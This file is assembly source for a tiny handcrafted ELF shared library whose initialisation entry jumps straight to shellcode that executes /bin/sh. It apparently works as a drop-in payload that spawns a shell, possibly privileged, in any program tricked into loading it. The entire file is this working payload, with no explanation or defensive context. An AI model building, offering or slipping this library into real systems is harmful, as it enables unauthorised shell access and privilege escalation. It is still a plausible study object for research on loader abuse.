BITS 64

ehdr:                               ; Elf64_Ehdr
        db  0x7f, "ELF", 2, 1, 1, 0 ; e_ident
times 8 db  0
        dw  3                       ; e_type
        dw  0x3e                    ; e_machine
        dd  1                       ; e_version
        dq  shell                   ; e_entry
        dq  phdr - $$               ; e_phoff
        dq  0                       ; e_shoff
        dd  0                       ; e_flags
        dw  ehdrsize                ; e_ehsize
        dw  phdrsize                ; e_phentsize
        dw  2                       ; e_phnum
        dw  0                       ; e_shentsize
        dw  0                       ; e_shnum
        dq  0                       ; e_shstrndx
ehdrsize  equ  $ - ehdr

phdr:                               ; Elf64_Phdr
        dd  1                       ; p_type
        dd  7                       ; p_flags
        dq  0                       ; p_offset
        dq  $$                      ; p_vaddr
        dq  $$                      ; p_paddr
        dq  progsize                ; p_filesz
        dq  progsize                ; p_memsz
        dq  0x1000                  ; p_align
phdrsize  equ  $ - phdr
        ; PT_DYNAMIC segment
        dd  2                       ; p_type
        dd  7                       ; p_flags
        dq  dynamic                 ; p_offset
        dq  dynamic                 ; p_vaddr
        dq  dynamic                 ; p_paddr
        dq  dynsize                 ; p_filesz
        dq  dynsize                 ; p_memsz
        dq  0x1000                  ; p_align

shell:
        ; execve("/bin/sh", ["/bin/sh"])
        mov  rdi, 0x68732f6e69622f
        push rdi
        push rsp
        pop  rdi
        push 59
        pop  rax

        ; Adjust stack address for argv
        push 0
        push rdi
        mov  rsi, rsp
        cdq
        syscall

dynamic:
  dt_init:
        dq  0xc, shell
  dt_strtab:
        dq  0x5, shell
  dt_symtab:
        dq  0x6, shell
dynsize  equ  $ - dynamic

progsize  equ  $ - $$
